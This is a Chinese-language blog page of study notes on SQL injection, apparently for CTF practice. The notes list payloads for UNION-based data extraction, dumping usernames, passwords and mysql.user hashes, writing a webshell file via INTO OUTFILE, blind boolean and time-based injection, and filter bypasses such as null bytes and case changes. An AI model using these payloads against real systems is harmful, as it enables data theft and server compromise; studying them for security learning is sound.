@@ -1,0 +1,323 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>sql注入系统学习 | wanan</title><meta name="keywords" content="CTF,SQL"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sql注入系统学习寻找及确认sql注入于参数后面加一个单引号’and于or加法和减法数字型不需要单引号时  利用sql注入识别数据库asp和.net	Microsoft SQL ServerPHP			Mysql.PostgreSQLjava		Oracle.Mysql  基于错误识别数据库需要一条详细的报错信息  基于数字函数推断   数据库服务器 函数    Mircrosoft SQL Se">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入系统学习">
+<meta property="og:url" content="https://www.wanan.red/SQL/sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/SQL/sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="sql注入系统学习寻找及确认sql注入于参数后面加一个单引号’and于or加法和减法数字型不需要单引号时  利用sql注入识别数据库asp和.net	Microsoft SQL ServerPHP			Mysql.PostgreSQLjava		Oracle.Mysql  基于错误识别数据库需要一条详细的报错信息  基于数字函数推断   数据库服务器 函数    Mircrosoft SQL Se">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.pixabay.com/photo/2017/05/09/03/46/alberta-2297204_1280.jpg">
+<meta property="article:published_time" content="2022-03-09T11:00:36.897Z">
+<meta property="article:modified_time" content="2022-08-30T06:44:17.246Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="SQL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2017/05/09/03/46/alberta-2297204_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/SQL/sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/SQL/sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sql注入系统学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-08-30 14:44:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">64</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">66</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2017/05/09/03/46/alberta-2297204_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql注入系统学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-09T11:00:36.897Z" title="发表于 2022-03-09 19:00:36">2022-03-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-30T06:44:17.246Z" title="更新于 2022-08-30 14:44:17">2022-08-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/SQL/">SQL</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/SQL/sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/">sql注入系统学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sql注入系统学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="sql注入系统学习"><a href="#sql注入系统学习" class="headerlink" title="sql注入系统学习"></a>sql注入系统学习</h1><h2 id="寻找及确认sql注入"><a href="#寻找及确认sql注入" class="headerlink" title="寻找及确认sql注入"></a>寻找及确认sql注入</h2><h3 id="于参数后面加一个单引号’"><a href="#于参数后面加一个单引号’" class="headerlink" title="于参数后面加一个单引号’"></a>于参数后面加一个单引号’</h3><h3 id="and于or"><a href="#and于or" class="headerlink" title="and于or"></a>and于or</h3><h3 id="加法和减法"><a href="#加法和减法" class="headerlink" title="加法和减法"></a>加法和减法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字型不需要单引号时</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用sql注入"><a href="#利用sql注入" class="headerlink" title="利用sql注入"></a>利用sql注入</h2><h3 id="识别数据库"><a href="#识别数据库" class="headerlink" title="识别数据库"></a>识别数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asp和.net	Microsoft SQL Server</span><br><span class="line">PHP			Mysql.PostgreSQL</span><br><span class="line">java		Oracle.Mysql</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于错误识别数据库"><a href="#基于错误识别数据库" class="headerlink" title="基于错误识别数据库"></a>基于错误识别数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要一条详细的报错信息</span><br></pre></td></tr></table></figure>
+
+<h4 id="基于数字函数推断"><a href="#基于数字函数推断" class="headerlink" title="基于数字函数推断"></a>基于数字函数推断</h4><table>
+<thead>
+<tr>
+<th>数据库服务器</th>
+<th>函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Mircrosoft SQL Server</td>
+<td>@@pack_received.@@rowcount</td>
+</tr>
+<tr>
+<td>Mysql</td>
+<td>connection_id().last_insert_id().row_count().len()</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>BITAND(1,1).length()</td>
+</tr>
+<tr>
+<td>postgreSQL</td>
+<td>select EXTRACT(DOW FROM NOW())</td>
+</tr>
+</tbody></table>
+<p>connection_id()不管值多少都是正的也就是真的,last_insert_id()这里不存在insert语句,默认情况就是返回零,也就是假.</p>
+<p>那么如果and connection_id()数据返回正常,and last_insert_id()不返回数据我们就可以推断这个是一个mysql数据库了</p>
+<h3 id="UNION语句提取数据"><a href="#UNION语句提取数据" class="headerlink" title="UNION语句提取数据"></a>UNION语句提取数据</h3><p>UNION语句可以合并两条或多条SELECT语句的查询结果,如果应用返回了第一条查询语句的数据,我们就可以在第一条查询语句后面注入一个UNION运算符添加一个任意查询,来提取数据,但是必须满足两个条件</p>
+<ul>
+<li><p>两个查询返回的列数必须相同</p>
+<p>  可以使用NULL来尝试,由于NULL值会转成任何数据类型</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select null,null,null...	这样加上去知道不返回错误</span><br><span class="line">order by 4	</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>两个查询语句对于列返回的数据类型必须相同</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用我们的测试字符串进行替换null</span><br><span class="line">union select user(),@@version,null</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="枚举数据库"><a href="#枚举数据库" class="headerlink" title="枚举数据库"></a>枚举数据库</h3><p>表,列,数据存放在information_schema数据库中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库名存放在information_schema数据库下的schemata表的schema_name字段中</span><br><span class="line">union select null,schema_name,null from information_shcema.schemata</span><br><span class="line"></span><br><span class="line">表名存放在information_schema数据库下tables表table_name字段中</span><br><span class="line">union select null,table_name,null from information_schema.tables where table_schema=&quot;wanan&quot;</span><br><span class="line"></span><br><span class="line">数据在表里</span><br><span class="line">union select username,password ,null from users</span><br></pre></td></tr></table></figure>
+
+<h3 id="窃取哈希口令"><a href="#窃取哈希口令" class="headerlink" title="窃取哈希口令"></a>窃取哈希口令</h3><p>mysql在mysql.user表中存储哈希口令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user,password from mysql.user</span><br><span class="line">哈希口令是通过PASSWORD()函数计算的</span><br><span class="line">select password(&#x27;wanan&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><p>利用sql注入像服务器写文件(这里需要得到网站的绝对路径)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select into outfile(dumpfile)//mysql 写文件命令</span><br><span class="line">select &quot;&lt;?php echo &#x27;test&#x27;;?&gt;&quot; into outfile &quot;/var/www/test.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.提交一个导致sql查询无效时,会返回一个通用错误页面,提交正确则会返回一个内容可被适度控制的页面</span><br><span class="line">2.提交一个导致sql查询无效时,会返回一个通用的错误页面,提交正确则会返回一个内容不可空页面</span><br><span class="line">3.提交受损或不正确的sql即不会产生错误页面,也不会以任何方式影响页面输出</span><br></pre></td></tr></table></figure>
+
+<h3 id="基于布尔"><a href="#基于布尔" class="headerlink" title="基于布尔"></a>基于布尔</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUBSTRING(str,pos,len)</span><br><span class="line">没有len参数的形式返回一个字符串从字符串str从位置pos开始。一个len参数的形式返回len个字符长的字符串str的子串，从位置pos开始，形式使用的是标准的SQL语法。另外，也可以使用负的值为pos。在这种情况下，刚开始的子串位置的字符结尾的字符串，而不是开始。负的值可用于为pos在此函数中的任何形式的。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and SUBSTRING(user(),1,1)=&#x27;a&#x27;			看返回true还是false</span><br></pre></td></tr></table></figure>
+
+<h3 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select if(SUBSTRING(user(),1,4)=&#x27;root&#x27;,sleep(4),1),null,null</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕开过滤"><a href="#绕开过滤" class="headerlink" title="绕开过滤"></a>绕开过滤</h2><h3 id="大小写变种"><a href="#大小写变种" class="headerlink" title="大小写变种"></a>大小写变种</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如使用strstr($id,&#x27;union&#x27;) strstr()函数是对大小写敏感的,所以可以大小写绕过</span><br></pre></td></tr></table></figure>
+
+<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对数据进行url编码</span><br></pre></td></tr></table></figure>
+
+<p>双url编码,但是前提是后面有一个url解码</p>
+<h3 id="sql注释"><a href="#sql注释" class="headerlink" title="sql注释"></a>sql注释</h3><p>当仅使用strstr($id,’ ‘)过滤空格时,可以使用注释符等绕过</p>
+<h3 id="空字符"><a href="#空字符" class="headerlink" title="空字符"></a>空字符</h3><p>通常的输入过滤器都是在应用程序之外的代码实现的。比如<a target="_blank" rel="noopener" href="http://www.ichunqiu.com/course/298?bbs">入侵检测系统</a>（IDS），这些系统一般是由原生编程语言开发而成，比如C++，为什么空字节能起作用呢，就是因为在原生变成语言中，根据字符串起始位置到第一个出现空字节的位置来确定字符串长度。所以说空字节就有效的终止了字符串。</p>
+<p> 只需要在过滤器阻止的字符串前面提供一个采用URL编码的空字节即可，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00&#x27; union select username,password from users where username=&#x27;admin&#x27; --</span><br></pre></td></tr></table></figure>
+
+<h3 id="二次SQL注入"><a href="#二次SQL注入" class="headerlink" title="二次SQL注入"></a>二次SQL注入</h3><p>查询的语句所用到的变量name就是从数据库提取到的我们的用户名，所以我们可以先利用更新我们的用户名功能插入语句进数据库。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/SQL/">SQL</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2017/05/09/03/46/alberta-2297204_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/SQL/sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95GET%E5%9E%8B-%E4%B8%80/SQL/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95GET%E5%9E%8B(%E4%B8%80)/"><img class="next-cover" src="https://cdn.pixabay.com/photo/2017/02/22/17/02/beach-2089936_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">sqlilabs靶场记录GET型(一)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/SQL/sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95update%E5%9E%8B-%E4%B8%89/SQL/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95update%E5%9E%8B(%E4%B8%89)/" title="sqlilabs靶场记录update型(三)"><img class="cover" src="https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-17</div><div class="title">sqlilabs靶场记录update型(三)</div></div></a></div><div><a href="/SQL/slqilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%85%AB/SQL/sel-slqilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5(%E5%85%AB)/" title="slqilabs靶场记录堆叠注入(八)"><img class="cover" src="https://cdn.pixabay.com/photo/2016/11/25/23/15/moon-1859616_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-22</div><div class="title">slqilabs靶场记录堆叠注入(八)</div></div></a></div><div><a href="/SQL/sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95POST%E5%9E%8B-%E4%BA%8C/SQL/sql-%20sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95POST%E5%9E%8B(%E4%BA%8C)/" title="sqlilabs靶场记录POST型(二)"><img class="cover" src="https://cdn.pixabay.com/photo/2018/11/17/22/15/trees-3822149_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-16</div><div class="title">sqlilabs靶场记录POST型(二)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">sql注入系统学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8F%8A%E7%A1%AE%E8%AE%A4sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">寻找及确认sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8E%E5%8F%82%E6%95%B0%E5%90%8E%E9%9D%A2%E5%8A%A0%E4%B8%80%E4%B8%AA%E5%8D%95%E5%BC%95%E5%8F%B7%E2%80%99"><span class="toc-number">1.1.1.</span> <span class="toc-text">于参数后面加一个单引号’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#and%E4%BA%8Eor"><span class="toc-number">1.1.2.</span> <span class="toc-text">and于or</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E6%B3%95%E5%92%8C%E5%87%8F%E6%B3%95"><span class="toc-number">1.1.3.</span> <span class="toc-text">加法和减法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">利用sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%86%E5%88%AB%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.1.</span> <span class="toc-text">识别数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E8%AF%86%E5%88%AB%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">基于错误识别数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%95%B0%E5%AD%97%E5%87%BD%E6%95%B0%E6%8E%A8%E6%96%AD"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">基于数字函数推断</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION%E8%AF%AD%E5%8F%A5%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">UNION语句提取数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.3.</span> <span class="toc-text">枚举数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E5%93%88%E5%B8%8C%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.2.4.</span> <span class="toc-text">窃取哈希口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96webshell"><span class="toc-number">1.2.5.</span> <span class="toc-text">获取webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.</span> <span class="toc-text">sql盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94"><span class="toc-number">1.3.1.</span> <span class="toc-text">基于布尔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4"><span class="toc-number">1.3.2.</span> <span class="toc-text">基于时间</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E5%BC%80%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.</span> <span class="toc-text">绕开过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E5%8F%98%E7%A7%8D"><span class="toc-number">1.4.1.</span> <span class="toc-text">大小写变种</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81"><span class="toc-number">1.4.2.</span> <span class="toc-text">URL编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E9%87%8A"><span class="toc-number">1.4.3.</span> <span class="toc-text">sql注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E5%AD%97%E7%AC%A6"><span class="toc-number">1.4.4.</span> <span class="toc-text">空字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.5.</span> <span class="toc-text">二次SQL注入</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
+      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
+      avatar: 'monsterid',
+      serverURLs: 'https://valine.wanan.red',
